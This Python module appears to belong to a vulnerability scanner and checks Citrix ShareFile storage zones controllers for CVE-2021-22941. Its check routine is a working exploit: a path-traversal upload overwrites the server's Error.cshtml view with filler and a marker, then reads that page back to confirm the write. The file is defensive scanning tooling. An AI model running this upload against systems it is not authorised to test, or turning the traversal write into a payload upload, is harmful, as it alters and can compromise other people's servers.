"""Agent Asteroid implementation for CVE-2021-22941"""

from requests import exceptions as requests_exceptions

from agent import definitions
from agent import exploits_registry

VULNERABILITY_TITLE = (
    "Improper Access Control in Citrix ShareFile storage zones controller."
)
VULNERABILITY_REFERENCE = "CVE-2021-22941"
VULNERABILITY_DESCRIPTION = (
    "Improper Access Control in Citrix ShareFile storage zones controller before 5.11.20 may "
    "allow an unauthenticated attacker to remotely compromise the storage zones controller."
)
RISK_RATING = "CRITICAL"

DEFAULT_TIMEOUT = 90


def _encode_multipart_formdata(files: dict[str, str]) -> tuple[str, str]:
    boundary = "boundary"
    body = "".join(
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="{files["name"]}"; filename="{files["filename"]}"\r\n'
        "\r\n"
        f"{files['content_file']}\r\n" + f"--{boundary}--\r\n"
    )
    content_type = f"multipart/form-data; boundary={boundary}"
    return body, content_type


@exploits_registry.register
class CVE20212941Exploit(definitions.Exploit):
    """CVE-2021-22941: Improper Access Control in Citrix ShareFile storage zones controller."""

    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
        targeted_by_malware=True,
        targeted_by_ransomware=True,
        targeted_by_nation_state=True,
        cve_ids=["CVE-2021-22941"],
    )

    def accept(self, target: definitions.Target) -> bool:
        try:
            req = self.session.get(target.origin, timeout=DEFAULT_TIMEOUT)
        except requests_exceptions.RequestException:
            return False
        return "ShareFile" in req.text

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        content_file = "A" * 4096
        files = {"name": "text4", "filename": "text5", "content_file": content_file}
        data, content_type = _encode_multipart_formdata(files)
        headers = {"Content-Type": content_type}
        payload = "__VULNERABLE__"
        params = {
            "uploadid": payload + r"/../../ConfigService\Views\Shared\Error.cshtml",
            "bp": "123",
            "accountid": "123",
        }
        try:
            self.session.post(
                target.origin + "/upload.aspx",
                data=data,
                params=params,
                headers=headers,
                timeout=DEFAULT_TIMEOUT,
            )
            req = self.session.get(
                target.origin + "/configservice/Home/Error",
                timeout=DEFAULT_TIMEOUT,
            )
        except requests_exceptions.RequestException:
            return []
        if payload not in req.text:
            return []

        vulnerability = self.create_vulnerability(target)
        return [vulnerability]
